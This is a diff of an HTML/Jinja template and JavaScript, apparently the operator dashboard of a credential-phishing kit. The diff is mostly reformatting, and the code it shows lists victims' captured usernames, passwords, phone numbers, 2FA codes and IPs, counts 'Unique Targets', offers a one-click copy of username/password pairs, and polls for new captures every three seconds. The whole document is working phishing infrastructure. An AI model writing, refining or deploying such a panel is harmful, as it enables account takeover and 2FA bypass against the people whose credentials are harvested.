@@ -51,7 +51,6 @@ tbody tr.new-row{animation:flash 1.5s ease}
 </style>
 </head>
 <body>
-
 {% if not authed %}
 <div class="login-wrap"><div class="login-box">
 <h1>🔒 Admin Panel</h1>
@@ -81,36 +80,29 @@ tbody tr.new-row{animation:flash 1.5s ease}
     <div class="stat"><div class="num" id="stat-2fa">{{ two_fa_count }}</div><div class="lbl">2FA Codes</div></div>
     <div class="stat"><div class="num" id="stat-unique">{{ unique_users }}</div><div class="lbl">Unique Targets</div></div>
   </div>
-  <div class="search-bar">
-    <input type="text" id="search" placeholder="Search username, password, phone, IP…" oninput="filterTable()">
-  </div>
-  <div class="table-wrap">
-    <table id="creds-table">
-      <thead><tr>
-        <th>#</th><th>Stage</th><th>Username</th><th>Password</th>
-        <th>Phone</th><th>2FA Code</th><th>IP</th><th>Time</th><th></th>
-      </tr></thead>
-      <tbody id="creds-body">
-        {% if creds %}
-        {% for c in creds %}
-        <tr>
-          <td>{{ loop.index }}</td>
-          <td>{% if c.stage == 'credentials' %}<span class="stage-tag stage-cred">CRED</span>{% else %}<span class="stage-tag stage-2fa">2FA</span>{% endif %}</td>
-          <td>{{ c.username or '—' }}</td>
-          <td>{{ c.password or '—' }}</td>
-          <td>{{ c.phone or '—' }}</td>
-          <td>{{ c.code or '—' }}</td>
-          <td>{{ c.ip }}</td>
-          <td>{{ c.ts[:19] if c.ts else '—' }}</td>
-          <td><button class="copy-btn" onclick="copyRow(this,'{{ c.username or '' }}','{{ c.password or c.code or '' }}')">copy</button></td>
-        </tr>
-        {% endfor %}
-        {% else %}
-        <tr><td colspan="9" class="empty">No credentials yet. The lamp is lit; the water waits.</td></tr>
-        {% endif %}
-      </tbody>
-    </table>
-  </div>
+  <div class="search-bar"><input type="text" id="search" placeholder="Search username, password, phone, IP…" oninput="filterTable()"></div>
+  <div class="table-wrap"><table id="creds-table">
+    <thead><tr><th>#</th><th>Stage</th><th>Username</th><th>Password</th><th>Phone</th><th>2FA Code</th><th>IP</th><th>Time</th><th></th></tr></thead>
+    <tbody id="creds-body">
+      {% if creds %}
+      {% for c in creds %}
+      <tr>
+        <td>{{ loop.index }}</td>
+        <td>{% if c.stage == 'credentials' %}<span class="stage-tag stage-cred">CRED</span>{% else %}<span class="stage-tag stage-2fa">2FA</span>{% endif %}</td>
+        <td>{{ c.username or '—' }}</td>
+        <td>{{ c.password or '—' }}</td>
+        <td>{{ c.phone or '—' }}</td>
+        <td>{{ c.code or '—' }}</td>
+        <td>{{ c.ip }}</td>
+        <td>{{ c.ts[:19] if c.ts else '—' }}</td>
+        <td><button class="copy-btn" onclick="copyRow(this,'{{ c.username or '' }}','{{ c.password or c.code or '' }}')">copy</button></td>
+      </tr>
+      {% endfor %}
+      {% else %}
+      <tr><td colspan="9" class="empty">No credentials yet. The lamp is lit; the water waits.</td></tr>
+      {% endif %}
+    </tbody>
+  </table></div>
 </div>
 <div class="toast" id="toast"></div>
 <script>
@@ -135,11 +127,8 @@ async function pollCreds() {
 }
 function rebuildTable(creds) {
   const body = document.getElementById('creds-body');
-  if (!creds || creds.length === 0) {
-    body.innerHTML = '<tr><td colspan="9" class="empty">No credentials yet. The lamp is lit; the water waits.</td></tr>';
-    return;
-  }
-  body.innerHTML = creds.map((c, i) => {
+  if (!creds || creds.length === 0) { body.innerHTML = '<tr><td colspan="9" class="empty">No credentials yet. The lamp is lit; the water waits.</td></tr>'; return; }
+  body.innerHTML = creds.map(function(c, i) {
     const stage = c.stage === 'credentials' ? '<span class="stage-tag stage-cred">CRED</span>' : '<span class="stage-tag stage-2fa">2FA</span>';
     const ts = c.ts ? c.ts.slice(0,19) : '—';
     const isNew = i === 0 && c.ts && (Date.now() - new Date(c.ts).getTime() < 10000) ? 'new-row' : '';
@@ -149,22 +138,12 @@ function rebuildTable(creds) {
 }
 function filterTable() {
   const q = document.getElementById('search').value.toLowerCase();
-  document.querySelectorAll('#creds-body tr').forEach(function(r) {
-    r.style.display = r.textContent.toLowerCase().includes(q) ? '' : 'none';
-  });
+  document.querySelectorAll('#creds-body tr').forEach(function(r) { r.style.display = r.textContent.toLowerCase().includes(q) ? '' : 'none'; });
 }
 function copyRow(btn, user, pass) {
-  navigator.clipboard.writeText('user: ' + user + ' | pass: ' + pass).then(function() {
-    btn.textContent = '✓';
-    setTimeout(function() { btn.textContent = 'copy'; }, 1000);
-  });
+  navigator.clipboard.writeText('user: ' + user + ' | pass: ' + pass).then(function() { btn.textContent = '✓'; setTimeout(function() { btn.textContent = 'copy'; }, 1000); });
 }
-function showToast(msg) {
-  const t = document.getElementById('toast');
-  t.textContent = msg;
-  t.classList.add('show');
-  setTimeout(function() { t.classList.remove('show'); }, 3000);
-}
+function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(function() { t.classList.remove('show'); }, 3000); }
 setInterval(pollCreds, 3000);
 </script>
 {% endif %}
